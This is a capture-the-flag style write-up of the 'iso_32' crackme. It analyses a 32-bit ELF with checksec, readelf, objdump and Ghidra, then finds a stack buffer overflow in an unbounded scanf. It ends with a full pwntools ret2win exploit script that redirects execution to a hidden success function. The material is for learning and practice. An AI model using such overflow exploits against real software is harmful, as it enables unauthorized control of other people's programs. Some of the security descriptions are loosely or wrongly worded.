# iso_32

> **Description**: a 32bit elf crackme try to solve it :)

## Overview

| Property       | Detail                                                            |
| -------------- | ----------------------------------------------------------------- |
| Author         | math\_\_0x0                                                       |
| Platform       | Unix/linux etc.                                                   |
| Language       | C/C++                                                             |
| Difficulty     | 3.0                                                               |
| Arch           | x86                                                               |
| Challenge link | [Click me](https://crackmes.one/crackme/5d8dfa7433c5d46f00e2c544) |

## Analysis

### File

First, i tried to check this file

```bash
$ file crackme

crackme: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a10d6ed49f272c25271e1942ff8e2b7ce6a80a34, for GNU/Linux 3.2.0, not stripped

```

Second, i tried to check which security in file

```bashNo canary protection when program cause have overflow
$ checksec --file=./crackme

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   69 Symbols	  No	0		1		./crackme
```

**Security details**
| Property | Detail |
| -------------- | ---------------------------------------|
| Partial RELRO | GOT overwrite protection|
| No canary found | No canary protection when program crashed overflow |
| NX disabled | Protection from shellcode |
| No PIE | Static base address when program running |

### ELF & Disassemble

Fourth, discovery ELF header

```bash
$ readelf -h ./crackme

ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x8049070
  Start of program headers:          52 (bytes into file)
  Start of section headers:          14296 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         11
  Size of section headers:           40 (bytes)
  Number of section headers:         29
  Section header string table index: 28

```

This program started at address `0x8049070`, usually it is a `start` function before calling `main` function

Fiveth, disassamble this program

```text
-> main
08049218 <main>:
 8049218:	55                   	push   ebp
 8049219:	89 e5                	mov    ebp,esp
 804921b:	83 e4 f0             	and    esp,0xfffffff0
 804921e:	e8 16 00 00 00       	call   8049239 <__x86.get_pc_thunk.ax>
 8049223:	05 dd 2d 00 00       	add    eax,0x2ddd
 8049228:	e8 ab ff ff ff       	call   80491d8 <f>
 804922d:	e8 7b ff ff ff       	call   80491ad <__f_func>
 8049232:	b8 00 00 00 00       	mov    eax,0x0
 8049237:	c9                   	leave
 8049238:	c3                   	ret
```

This main function call `f` function, it's assembly like this:

```text
-> f
080491d8 <f>:
 80491d8:	55                   	push   ebp
 80491d9:	89 e5                	mov    ebp,esp
 80491db:	53                   	push   ebx
 80491dc:	83 ec 24             	sub    esp,0x24
 80491df:	e8 dc fe ff ff       	call   80490c0 <__x86.get_pc_thunk.bx>
 80491e4:	81 c3 1c 2e 00 00    	add    ebx,0x2e1c
 80491ea:	83 ec 0c             	sub    esp,0xc
 80491ed:	8d 83 22 e0 ff ff    	lea    eax,[ebx-0x1fde]
 80491f3:	50                   	push   eax
 80491f4:	e8 37 fe ff ff       	call   8049030 <printf@plt>
 80491f9:	83 c4 10             	add    esp,0x10
 80491fc:	83 ec 08             	sub    esp,0x8
 80491ff:	8d 45 d8             	lea    eax,[ebp-0x28]
 8049202:	50                   	push   eax
 8049203:	8d 83 36 e0 ff ff    	lea    eax,[ebx-0x1fca]
 8049209:	50                   	push   eax
 804920a:	e8 51 fe ff ff       	call   8049060 <__isoc99_scanf@plt>
 804920f:	83 c4 10             	add    esp,0x10
 8049212:	90                   	nop
 8049213:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
 8049216:	c9                   	leave
 8049217:	c3                   	ret
```

I think logic program declared on f function, next i get assembly from f_func function like this

```text
-> f_func

80491ad <__f_func>:
 80491ad:	55                   	push   ebp
 80491ae:	89 e5                	mov    ebp,esp
 80491b0:	53                   	push   ebx
 80491b1:	83 ec 04             	sub    esp,0x4
 80491b4:	e8 80 00 00 00       	call   8049239 <__x86.get_pc_thunk.ax>
 80491b9:	05 47 2e 00 00       	add    eax,0x2e47
 80491be:	83 ec 0c             	sub    esp,0xc
 80491c1:	8d 90 11 e0 ff ff    	lea    edx,[eax-0x1fef]
 80491c7:	52                   	push   edx
 80491c8:	89 c3                	mov    ebx,eax
 80491ca:	e8 71 fe ff ff       	call   8049040 <puts@plt>
 80491cf:	83 c4 10             	add    esp,0x10
 80491d2:	90                   	nop
 80491d3:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
 80491d6:	c9                   	leave
 80491d7:	c3                   	ret

```

### Pseudocode

To jump into deep analysis i used `ghidra`, i got the pseudocode in main func like this

```c++
undefined4 main(void)

{
  f();
  __f_func();
  return 0;
}
```

i go to `f` function like this

```c++
void f(void)

{
  undefined1 local_2c [36];
  
  printf("enter the password:");
  __isoc99_scanf(&DAT_0804a036,local_2c);
  return;
}
```

`f` function declared variabel 36 bytes size, i think i can to be make crashed program with buffer overflow, and other side i found s_func, it's function don't call in `f` function, means i can ret2 function technique to jump into s_func. s_func like this:

```c++
void __s_func(void)

{
  puts("Great !!");
  return;
}
```

## Exploitation

First, i make a `de brujin` payload to cause SISGEV

```python
from pwn import *

payload = cyclic(100)
```

Second, i send payload into program when program request a input and program got crashed

```
Invalid address 0x6161616c
```

Third, i solved this challenge with crafted payload with `pwntools`

### Final Payload

```python
from pwn import *
import argparse
import os

# ==========================================
# CONFIGURATION
# ==========================================

# File executable target

exe = "./crackme"
elf = ELF(exe)
context.binary = elf
context.arch = elf.arch
context.log_level = "info"

# ==========================================
# ARGUMENT PARSER
# ==========================================

parser = argparse.ArgumentParser(
    description="Pwntools Solver"
)

parser.add_argument(
    "mode",
    choices=["local", "remote"],
    help="Execution mode"
)

args = parser.parse_args()

# ==========================================
# CONNECTION
# ==========================================

def start():

    if args.mode == "local":

        log.info("Starting local process")

        return process(exe)

# ==========================================
# EXPLOIT / SOLVER
# ==========================================

def exploit(io):

    offset = cyclic_find(0x6161616c)
    s_func_address = 0x08049182

    payload = b'A' * offset
    payload += p32(s_func_address)

    io.sendline(payload)

    res = io.recv(timeout=2)
    print(res)

    io.interactive()

# ==========================================
# MAIN
# ==========================================

def main():

    io = start()

    exploit(io)

    io.interactive()


if __name__ == "__main__":
    main()
```

### Result
```bash
[+] Starting local process './crackme': pid 165681
b'enter the password:Great !!\n'
```